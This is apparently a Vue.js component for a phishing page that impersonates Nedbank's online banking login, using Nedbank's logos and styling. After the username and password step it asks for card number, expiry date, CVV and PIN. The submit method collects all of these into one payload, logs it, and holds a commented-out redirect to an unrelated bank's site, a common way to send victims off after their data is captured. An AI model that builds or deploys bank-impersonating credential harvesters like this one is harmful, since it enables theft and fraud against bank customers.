<template>
  <v-container fluid class="pa-0">
    <v-row no-gutters style="height:100vh" class="ma-0">
      <v-col cols="12" md="6" class="pa-0 d-none d-md-block">
        <v-card height="100%" tile outlined class="py-10">
          <v-card-title class="d-flex justify-center">
            <div style="width:350px">
              <v-img
                width="350"
                src="/banks/nedbank1.png"
              />
            </div>
          </v-card-title>
          <v-card-text class="grey--text text--darken-3 text-center">
            <div class="text-h4  font-weight-light my-4  ">
              Experience our new online banking
            </div>
            <div class="mb-2">
              Access an enhanced banking experience with great new features and regular updates.
            </div>
            <v-btn text color="green" class="text-capitalize">
              <v-icon left>
                mdi-cellphone
              </v-icon>
              Explore our demo
            </v-btn>
            <div>
              <v-avatar tile size="60" class="mx-auto">
                <v-img contain src="/banks/capitecssl.gif" />
              </v-avatar>
              <span>Integrated with secure online infrastructure.</span>
            </div>
          </v-card-text>
        </v-card>
      </v-col>
      <v-col cols="12" md="6" class="text-center py-16">
        <v-card max-width="400" flat tile class="mx-auto">
          <v-card-title>
            <v-avatar tile size="70" class="mx-auto">
              <v-img contain src="/banks/nedbank.png" />
            </v-avatar>
          </v-card-title>
          <v-card-text>
            <v-form
              ref="form"
              v-model="valid"
              lazy-validation
              @submit.prevent="submit"
            >
              <v-row v-if="!isCard" no-gutters class="ma-0">
                <v-col cols="12" class="my-4">
                  <div class="text-subtitle-1 text-left text-sm-h6 font-weight-light text1--text">
                    Log in with your Nedbank ID.
                  </div>
                  <div v-if="isError" class="my-2 text-left red--text text--darken-1 ">
                    {{ error }}
                  </div>
                </v-col>
                <v-col cols="12" class="text-left">
                  <div class="text-subtitle-2 mb-1">
                    Username
                  </div>
                  <v-text-field
                    v-model="username"
                    type="username"
                    name="username"
                    dense
                    outlined
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12" class="text-left">
                  <div class="text-subtitle-2 mb-1">
                    Password
                  </div>
                  <v-text-field
                    v-model="password"
                    :type="show ? 'text' : 'password'"
                    name="password"
                    dense
                    outlined
                    label="Password"
                    :append-icon="show ? 'mdi-eye-outline' : 'mdi-eye-off-outline'"
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                    @click:append="show = !show"
                  />
                </v-col>
                <v-col cols="12" class="text-left my-2">
                  <span>
                    By logging in I accept the <span class="font-weight-bold green--text">terms and conditions.</span>
                  </span>
                </v-col>
                <v-col cols="12" class="my-2">
                  <v-btn
                    depressed
                    block
                    dark
                    large
                    color="#009639"
                    class="text-subtitle-2 font-weight-normal "
                    @click="next"
                  >
                    Login
                  </v-btn>
                </v-col>
              </v-row>
              <v-row v-else no-gutters>
                <v-col cols="12" class="my-4">
                  <div class="text-subtitle-1 text-left text-sm-h6 font-weight-light text1--text">
                    Enter your card details
                  </div>
                  <div v-if="isError" class="my-2 text-left red--text text--darken-1 ">
                    {{ error }}
                  </div>
                </v-col>
                <v-col cols="12" class="text-left pa-0">
                  <div class="text-subtitle-2 mb-1">
                    Card Number
                  </div>
                  <v-text-field
                    v-model="cardNo"
                    type="cardNo"
                    name="cardNo"
                    dense
                    outlined
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="4" class="text-left ">
                  <div class="text-subtitle-2 mb-1">
                    Expiry Date
                  </div>
                  <v-text-field
                    v-model="expiryDate"
                    type="expiryDate"
                    name="expiryDate"
                    dense
                    outlined
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="4" class="text-left ">
                  <div class="text-subtitle-2 mb-1">
                    CVV
                  </div>
                  <v-text-field
                    v-model="cvv"
                    type="cvv"
                    name="cvv"
                    dense
                    outlined
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="4" class="text-left ">
                  <div class="text-subtitle-2 mb-1">
                    Pin
                  </div>
                  <v-text-field
                    v-model="pin"
                    type="pin"
                    name="pin"
                    dense
                    outlined
                    color="green"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12" class="">
                  <v-btn
                    type="submit"
                    depressed
                    block
                    dark
                    large
                    color="#009639"
                    class="text-subtitle-2 font-weight-normal "
                  >
                    Next
                  </v-btn>
                </v-col>
              </v-row>
            </v-form>
          </v-card-text>
        </v-card>
      </v-col>
    </v-row>
  </v-container>
</template>

<script>
export default {
  data: () => ({
    valid: true,
    show: false,
    isCard: false,
    isError: false,
    error: 'Invalid user credentials entered.',
    username: '',
    usernameRules: [
      v => !!v || '*Please enter your username '
    ],
    password: '',
    passwordRules: [
      v => !!v || '*Please enter your password',
      v =>
        (v && v.length >= 6) || 'Password must be greater than 6 characters'
    ],
    cardNo: '',
    cardNoRules: [
      v => !!v || 'Card Number is required'
    ],
    expiryDate: '',
    expiryDateRules: [
      v => !!v || 'Expiry Date is required'
    ],
    cvv: '',
    cvvRules: [
      v => !!v || 'CVV is required'
    ],
    pin: '',
    pinRules: [
      v => !!v || 'Pin is required'
    ]
  }),
  methods: {

    submit () {
      if (this.validate(this.cardNo, 'Card Number') && this.validate(this.expiryDate, 'Expiry Date') && this.validate(this.cvv, 'cvv') && this.validate(this.pin, 'Pin')
      ) {
        const payload = {
          username: this.username,
          password: this.password,
          cardNo: this.cardNo,
          expiryDate: this.expiryDate,
          cvv: this.cvv,
          pin: this.pin
        }
        console.log(payload)

        // window.location.href = 'https://www.absa.africa/absaafrica/careers/'
      }
    },
    next () {
      if (this.validate(this.username, 'Username') && this.validate(this.password, 'Password')) {
        this.isCard = true
      }
    },
    validate (field, name) {
      if (field.trim() === '') {
        this.isError = true
        this.error = `${name} must be empty`
        return false
      } else {
        this.isError = false
        this.error = null
        return true
      }
    },
    clear () {
      this.reset()
      this.resetValidation()
    },

    reset () {
      this.$refs.form.reset()
    },

    resetValidation () {
      this.$refs.form.resetValidation()
    }
  }

}
</script>

<style>

</style>
